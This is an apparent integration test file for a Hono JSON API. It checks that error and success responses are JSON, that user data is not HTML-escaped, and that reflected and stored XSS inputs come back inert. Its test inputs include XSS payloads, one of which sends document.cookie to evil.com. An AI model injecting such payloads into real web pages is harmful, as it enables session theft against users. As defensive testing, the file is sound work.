/**
 * XSS Prevention Integration Tests
 *
 * Tests that the API properly prevents XSS attacks through:
 * - Correct Content-Type headers (application/json)
 * - Error responses formatted as JSON, not HTML
 * - Data integrity preservation (no HTML escaping corruption)
 * - No reflected XSS in error messages
 *
 * Note: For JSON APIs, XSS protection is primarily about:
 * 1. Serving responses with application/json Content-Type
 * 2. Not reflecting untrusted input in HTML error pages
 * 3. Preserving data integrity (frontend handles safe rendering)
 */

import { describe, it, expect, beforeAll } from 'vitest'
import { Hono } from 'hono'
import { getEnv, getDb, getSqlite, type TestEnv } from '../setup'
import { createTestScenario } from '../fixtures'
import type { HonoEnv } from '../../types'
import { api } from '../../routes'
import { errorHandler } from '../../middleware/error-handler'
import { sessionMiddleware } from '../../lib/session'

/**
 * Creates a database wrapper that adds the `execute` method
 * The better-sqlite3 drizzle doesn't have execute, but D1 does
 */
function createTestDb() {
  const db = getDb()
  return new Proxy(db, {
    get(target, prop) {
      if (prop === 'execute') {
        return target.run.bind(target)
      }
      return (target as any)[prop]
    },
  })
}

describe('XSS Prevention', () => {
  let app: Hono<HonoEnv>
  let env: TestEnv

  beforeAll(() => {
    env = getEnv()
    app = new Hono<HonoEnv>()

    // Set up error handler
    app.onError(errorHandler)

    // Set up middleware to inject test environment
    app.use('*', async (c, next) => {
      // Inject environment bindings
      ;(c as any).env = env

      // Set up database
      const db = createTestDb()
      c.set('db', db)

      // Set up request context variables
      c.set('transactionId', crypto.randomUUID())
      c.set('ip', '127.0.0.1')
      c.set('userAgent', 'IntegrationTest/1.0')

      await next()
    })

    // Session middleware - reads session from KV and sets sessionData in context
    app.use('*', sessionMiddleware())

    // Mount API routes (includes sessionAuth and accountMiddleware)
    app.route('/api', api)
  })

  // ============================================================================
  // Content-Type Header Tests
  // ============================================================================

  describe('Content-Type Headers', () => {
    it('should return application/json content type for successful responses', async () => {
      const scenario = await createTestScenario({
        userName: 'Content Type Test User',
        userEmail: 'contenttype@example.com',
        role: 'VIEWER',
      })

      const res = await app.request('/api/accounts', {
        method: 'GET',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
        },
      })

      expect(res.status).toBe(200)
      expect(res.headers.get('content-type')).toContain('application/json')
    })

    it('should return application/json content type for error responses', async () => {
      const res = await app.request('/api/accounts', {
        method: 'GET',
        // No session cookie - should return 401
      })

      expect(res.status).toBe(401)
      expect(res.headers.get('content-type')).toContain('application/json')
    })

    it('should return application/json for 404 responses', async () => {
      const scenario = await createTestScenario({
        userName: 'Not Found Test User',
        userEmail: 'notfound@example.com',
        role: 'VIEWER',
      })

      const nonExistentId = crypto.randomUUID()
      const res = await app.request(`/api/users/${nonExistentId}`, {
        method: 'GET',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
        },
      })

      expect(res.status).toBe(404)
      expect(res.headers.get('content-type')).toContain('application/json')
    })

    it('should return application/json for validation error responses', async () => {
      const scenario = await createTestScenario({
        userName: 'Validation Test User',
        userEmail: 'validation@example.com',
        role: 'MANAGER',
      })

      const res = await app.request(`/api/users/${scenario.user.id}`, {
        method: 'PATCH',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ name: '' }), // Invalid: empty name
      })

      expect(res.status).toBe(400)
      expect(res.headers.get('content-type')).toContain('application/json')
    })
  })

  // ============================================================================
  // Reflected XSS Prevention Tests
  // ============================================================================

  describe('Reflected XSS Prevention', () => {
    it('should not reflect malicious input as HTML in error responses', async () => {
      const scenario = await createTestScenario({
        userName: 'Reflected XSS Test User',
        userEmail: 'reflectedxss@example.com',
        role: 'VIEWER',
      })

      // Attempt to inject script via URL parameter (user ID)
      const maliciousId = '<script>alert("xss")</script>'
      const res = await app.request(`/api/users/${encodeURIComponent(maliciousId)}`, {
        method: 'GET',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
        },
      })

      // Response should be JSON, not HTML
      expect(res.headers.get('content-type')).toContain('application/json')

      const body = await res.text()
      // Should be valid JSON (starts with {)
      expect(body.startsWith('{')).toBe(true)

      // The raw script tag should not appear unescaped in a way that browsers would execute
      // In JSON, it's safe because browser won't interpret JSON as HTML
      const parsed = JSON.parse(body)
      expect(parsed).toHaveProperty('error')
    })

    it('should not reflect script injection in account ID error responses', async () => {
      const scenario = await createTestScenario({
        userName: 'Account XSS Test User',
        userEmail: 'accountxss@example.com',
        role: 'VIEWER',
      })

      const maliciousAccountId = '"><img src=x onerror=alert(1)>'
      const res = await app.request(`/api/accounts/${encodeURIComponent(maliciousAccountId)}`, {
        method: 'GET',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
        },
      })

      expect(res.headers.get('content-type')).toContain('application/json')

      const body = await res.text()
      expect(body.startsWith('{')).toBe(true)
    })

    it('should return JSON error for malformed request with XSS attempt', async () => {
      const scenario = await createTestScenario({
        userName: 'Malformed XSS Test User',
        userEmail: 'malformedxss@example.com',
        role: 'MANAGER',
      })

      // Try to inject XSS via JSON body with malicious name
      const maliciousPayload = {
        name: '<script>document.location="http://evil.com?cookie="+document.cookie</script>',
      }

      const res = await app.request(`/api/users/${scenario.user.id}`, {
        method: 'PATCH',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(maliciousPayload),
      })

      // Response should be JSON regardless of input
      expect(res.headers.get('content-type')).toContain('application/json')

      const body = await res.text()
      expect(body.startsWith('{')).toBe(true)
    })
  })

  // ============================================================================
  // Data Integrity Tests (No HTML Escaping Corruption)
  // ============================================================================

  describe('Data Integrity', () => {
    it('should preserve special characters in user name without HTML escaping', async () => {
      const scenario = await createTestScenario({
        userName: 'Integrity Test User',
        userEmail: 'integrity@example.com',
        role: 'MANAGER',
      })

      // Update user name with special characters that would be escaped in HTML
      const specialName = 'Tom & Jerry <3 Movies'

      const updateRes = await app.request(`/api/users/${scenario.user.id}`, {
        method: 'PATCH',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ name: specialName }),
      })

      expect(updateRes.status).toBe(200)

      const updateBody = await updateRes.json()
      // Data should be preserved exactly as submitted, not HTML escaped
      expect(updateBody.data.name).toBe(specialName)
      expect(updateBody.data.name).not.toBe('Tom &amp; Jerry &lt;3 Movies')

      // Verify in database that data is stored correctly
      const sqlite = getSqlite()
      const row = sqlite.prepare('SELECT name FROM users WHERE id = ?').get(scenario.user.id) as { name: string }
      expect(row.name).toBe(specialName)
    })

    it('should preserve ampersands in account names', async () => {
      const scenario = await createTestScenario({
        userName: 'Ampersand Test User',
        userEmail: 'ampersand@example.com',
        role: 'MANAGER',
      })

      const nameWithAmpersand = 'Johnson & Johnson'

      const updateRes = await app.request(`/api/accounts/${scenario.account.id}`, {
        method: 'PATCH',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ name: nameWithAmpersand }),
      })

      expect(updateRes.status).toBe(200)

      const updateBody = await updateRes.json()
      expect(updateBody.data.name).toBe(nameWithAmpersand)
      // Should NOT be HTML escaped
      expect(updateBody.data.name).not.toBe('Johnson &amp; Johnson')
    })

    it('should preserve angle brackets in descriptions', async () => {
      const scenario = await createTestScenario({
        userName: 'Brackets Test User',
        userEmail: 'brackets@example.com',
        role: 'MANAGER',
      })

      const descriptionWithBrackets = 'Use <code> tags for code'

      const updateRes = await app.request(`/api/accounts/${scenario.account.id}`, {
        method: 'PATCH',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ description: descriptionWithBrackets }),
      })

      expect(updateRes.status).toBe(200)

      const updateBody = await updateRes.json()
      expect(updateBody.data.description).toBe(descriptionWithBrackets)
      // Should NOT be HTML escaped
      expect(updateBody.data.description).not.toBe('Use &lt;code&gt; tags for code')
    })

    it('should preserve quotes in names', async () => {
      const scenario = await createTestScenario({
        userName: 'Quotes Test User',
        userEmail: 'quotes@example.com',
        role: 'MANAGER',
      })

      const nameWithQuotes = 'The "Best" Company'

      const updateRes = await app.request(`/api/accounts/${scenario.account.id}`, {
        method: 'PATCH',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ name: nameWithQuotes }),
      })

      expect(updateRes.status).toBe(200)

      const updateBody = await updateRes.json()
      expect(updateBody.data.name).toBe(nameWithQuotes)
      // Should NOT be HTML escaped
      expect(updateBody.data.name).not.toBe('The &quot;Best&quot; Company')
    })
  })

  // ============================================================================
  // JSON Response Format Tests
  // ============================================================================

  describe('JSON Response Format', () => {
    it('should return valid JSON for all error types', async () => {
      // Use MANAGER role to have permission to PATCH users
      const scenario = await createTestScenario({
        userName: 'JSON Format Test User',
        userEmail: 'jsonformat@example.com',
        role: 'MANAGER',
      })

      // Test 401 - Unauthorized
      const unauthorizedRes = await app.request('/api/users', {
        method: 'GET',
      })
      expect(unauthorizedRes.status).toBe(401)
      const unauthorizedBody = await unauthorizedRes.json()
      expect(unauthorizedBody).toHaveProperty('error')
      expect(unauthorizedBody.error).toHaveProperty('message')

      // Test 404 - Not Found
      const notFoundRes = await app.request(`/api/users/${crypto.randomUUID()}`, {
        method: 'GET',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
        },
      })
      expect(notFoundRes.status).toBe(404)
      const notFoundBody = await notFoundRes.json()
      expect(notFoundBody).toHaveProperty('error')

      // Test 400 - Bad Request (MANAGER role required for PATCH)
      const badRequestRes = await app.request(`/api/users/${scenario.user.id}`, {
        method: 'PATCH',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ name: '' }),
      })
      expect(badRequestRes.status).toBe(400)
      const badRequestBody = await badRequestRes.json()
      expect(badRequestBody).toHaveProperty('error')
    })

    it('should not return HTML error pages for API error responses', async () => {
      const scenario = await createTestScenario({
        userName: 'No HTML Error Test User',
        userEmail: 'nohtmlerror@example.com',
        role: 'VIEWER',
      })

      // Test API routes that go through our error handler
      // Use valid UUID format to ensure the request reaches our route handlers
      const testCases = [
        // Non-existent user ID - should return JSON 404
        { path: `/api/users/${crypto.randomUUID()}`, expectedStatus: 404 },
        // Non-existent account ID - should return JSON 404
        { path: `/api/accounts/${crypto.randomUUID()}`, expectedStatus: 404 },
        // List users with query params (query params are ignored, should return 200)
        { path: '/api/users', expectedStatus: 200 },
        // List accounts should return JSON
        { path: '/api/accounts', expectedStatus: 200 },
      ]

      for (const testCase of testCases) {
        const res = await app.request(testCase.path, {
          method: 'GET',
          headers: {
            ...scenario.headers,
            'User-Agent': 'IntegrationTest/1.0',
            'account-id': scenario.account.id,
          },
        })

        const contentType = res.headers.get('content-type')
        const body = await res.text()

        // Should always return JSON, never HTML
        expect(contentType).toContain('application/json')
        expect(body).not.toContain('<!DOCTYPE')
        expect(body).not.toContain('<html')
        expect(res.status).toBe(testCase.expectedStatus)
      }
    })
  })

  // ============================================================================
  // XSS via Stored Data Tests
  // ============================================================================

  describe('Stored XSS Prevention', () => {
    it('should store malicious-looking input as-is and return it safely in JSON', async () => {
      const scenario = await createTestScenario({
        userName: 'Stored XSS Test User',
        userEmail: 'storedxss@example.com',
        role: 'MANAGER',
      })

      // Store a name that looks like an XSS attack
      const maliciousName = '<script>alert("stored xss")</script>'

      const updateRes = await app.request(`/api/users/${scenario.user.id}`, {
        method: 'PATCH',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ name: maliciousName }),
      })

      expect(updateRes.status).toBe(200)

      // Fetch the user to verify stored data
      const getRes = await app.request(`/api/users/${scenario.user.id}`, {
        method: 'GET',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
        },
      })

      expect(getRes.status).toBe(200)
      expect(getRes.headers.get('content-type')).toContain('application/json')

      const getBody = await getRes.json()
      // Data is stored and returned as-is (JSON string, not executed)
      expect(getBody.data.name).toBe(maliciousName)

      // The response is safe because:
      // 1. Content-Type is application/json (browser won't execute as HTML)
      // 2. Data is JSON-encoded (script tags are just strings)
    })

    it('should handle event handler injection attempts in descriptions', async () => {
      const scenario = await createTestScenario({
        userName: 'Event Handler Test User',
        userEmail: 'eventhandler@example.com',
        role: 'MANAGER',
      })

      const maliciousDescription = '<img src=x onerror="alert(1)">'

      const updateRes = await app.request(`/api/accounts/${scenario.account.id}`, {
        method: 'PATCH',
        headers: {
          ...scenario.headers,
          'User-Agent': 'IntegrationTest/1.0',
          'account-id': scenario.account.id,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ description: maliciousDescription }),
      })

      expect(updateRes.status).toBe(200)

      const body = await updateRes.json()
      // Data preserved as-is (frontend responsible for safe rendering)
      expect(body.data.description).toBe(maliciousDescription)
      // Response is JSON, so it's safe
      expect(updateRes.headers.get('content-type')).toContain('application/json')
    })
  })
})
